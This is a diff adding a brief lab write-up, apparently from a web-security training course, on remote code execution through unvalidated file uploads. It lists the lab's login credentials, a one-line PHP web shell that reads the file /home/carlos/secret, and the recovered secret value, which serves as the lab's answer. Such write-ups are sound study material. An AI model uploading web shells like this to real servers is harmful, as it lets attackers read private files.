@@ -1,0 +1,14 @@
+Lab #1 - Remote code execution via web shell upload
+
+Vulnerable feature - No validation on user files upload before storing on server's system
+
+Goal - Upload a basic PHP web shell and use it to exflitrate the contents of the file `home/carlos/secret`.
+
+Analysis:
+
+your account - wiener:peter
+target url - /home/carlos/secret
+
+Create script.php with <?php echo file_get_contents('/home/carlos/secret'); ?>
+
+secret - UZayA36wgTVYyV8OGvKaXPdYITQDt9kU
